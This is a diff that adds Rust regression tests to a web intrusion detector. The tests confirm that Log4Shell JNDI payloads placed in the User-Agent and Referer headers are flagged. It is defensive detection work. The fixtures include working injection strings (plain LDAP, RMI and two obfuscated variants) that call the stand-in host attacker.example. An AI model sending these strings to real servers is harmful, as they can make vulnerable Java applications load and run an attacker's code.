@@ -566,4 +566,69 @@ mod tests {
             "obfuscated Log4Shell in Cookie must trip at score 60",
         );
     }
+
+    // 2026-05-09 — Run-7 GAP-008b regression. The QA report claimed
+    // "UA basic ${jndi:ldap://...}, UA RMI variant, UA nested
+    // ${${::-j}...}, UA lowercase-obfuscated ${${lower:j}ndi:...},
+    // Referer ${jndi:ldap://...}" still missed. Each is pinned
+    // here against the current code so the next QA run can't
+    // re-flag without an actual regression. If any of these fail,
+    // the QA harness was running an outdated binary.
+    #[test]
+    fn log4shell_run7_ua_basic_ldap() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view("user-agent", "${jndi:ldap://attacker.example/x}");
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
+
+    #[test]
+    fn log4shell_run7_ua_rmi_variant() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view("user-agent", "${jndi:rmi://attacker.example/x}");
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
+
+    #[test]
+    fn log4shell_run7_ua_nested_obfuscation() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view(
+            "user-agent",
+            "${${::-j}${::-n}${::-d}${::-i}:ldap://attacker.example/x}",
+        );
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
+
+    #[test]
+    fn log4shell_run7_ua_lowercase_obfuscation() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view("user-agent", "${${lower:j}ndi:ldap://attacker.example/x}");
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
+
+    #[test]
+    fn log4shell_run7_referer_basic_ldap() {
+        let d = CommandInjectionDetector;
+        let u: http::Uri = "/".parse().unwrap();
+        let m = http::Method::GET;
+        let h = log4shell_header_view("referer", "${jndi:ldap://attacker.example/x}");
+        let b = BodyPeek::empty();
+        let req = make_view(&m, &u, &h, &b);
+        assert!(d.inspect(&req).iter().any(|s| s.score == 60));
+    }
 }
